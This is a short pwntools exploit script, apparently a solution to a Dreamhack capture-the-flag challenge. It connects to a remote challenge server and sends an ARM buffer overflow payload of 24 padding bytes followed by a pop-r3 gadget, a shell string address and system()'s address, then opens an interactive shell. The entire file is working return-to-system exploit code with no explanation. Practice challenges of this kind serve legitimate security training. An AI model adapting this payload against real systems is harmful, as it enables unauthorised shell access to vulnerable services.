from pwn import *

p = remote('host3.dreamhack.games',14862)
context.arch = 'arm'

shell = 0x206a4
popr3 = 0x103c0
system = 0x10598

payload = b'a'*24
payload += p32(popr3) 
payload += p32(shell)
payload += p32(system)

p.sendline(payload)

p.interactive()